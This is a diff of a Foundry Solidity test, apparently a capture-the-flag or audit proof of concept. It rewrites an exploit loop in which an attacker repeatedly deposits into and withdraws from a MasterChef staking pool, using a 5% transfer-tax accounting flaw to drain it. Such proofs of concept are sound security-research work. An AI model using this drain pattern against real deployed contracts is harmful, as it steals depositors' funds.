@@ -70,29 +70,24 @@ contract InflationaryNetWorthTest is Test {
     // Exploit start
     vm.startPrank(attacker, attacker);
 
-    uint256 myBalance = mula.balanceOf(attacker);
-
     // Staking pool loses 5% of total deposited
     // amount each time attacker withdraws his deposit
 
-    for (uint256 i; i < 50; ++i) {
-      console2.log("%d before deposit, pendingMuny(attacker)", i, masterChef.pendingMuny(0, attacker));
-      console2.log("%d before deposit, pendingMuny(user)", i, masterChef.pendingMuny(0, user));
-      masterChef.deposit(0, myBalance);
-      console2.log("%d deposit(%d): mula.balanceOf(attacker)", i, myBalance, mula.balanceOf(attacker));
-      console2.log("%d deposit(%d): mula.balanceOf(address(masterChef))", i, myBalance, mula.balanceOf(address(masterChef)));
-      console2.log("%d deposit(%d): muny.balanceOf(attacker)", i, myBalance, muny.balanceOf(attacker));
-      // vm.roll(block.number + 1);
-      console2.log("%d after deposit, pendingMuny(attacker)", i, masterChef.pendingMuny(0, attacker));
-      console2.log("%d after deposit, pendingMuny(user)", i, masterChef.pendingMuny(0, user));
-      masterChef.withdraw(0, myBalance);
-      console2.log("%d withdraw(%d): mula.balanceOf(attacker)", i, myBalance, mula.balanceOf(attacker));
-      console2.log("%d withdraw(%d): mula.balanceOf(address(masterChef))", i, myBalance, mula.balanceOf(address(masterChef)));
-      console2.log("%d withdraw(%d): muny.balanceOf(attacker)", i, myBalance, muny.balanceOf(attacker));
-      console2.log("%d after withdraw, pendingMuny(attacker)", i, masterChef.pendingMuny(0, attacker));
-      console2.log("%d after withdraw, pendingMuny(user)", i, masterChef.pendingMuny(0, user));
+    uint256 attackerBalance = mula.balanceOf(attacker);
+    uint256 masterChefBalance;
 
-      myBalance = myBalance * 95 / 100;
+    while (true) {
+        masterChef.deposit(0,attackerBalance);
+        masterChefBalance = mula.balanceOf(address(masterChef))-1;
+
+        if (masterChefBalance < attackerBalance) {
+            masterChef.withdraw(0,masterChefBalance);
+            break;
+        } else {
+            masterChef.withdraw(0,attackerBalance);
+        }
+
+        attackerBalance = attackerBalance * 95 / 100; // post transfer tax
     }
 
     vm.stopPrank();
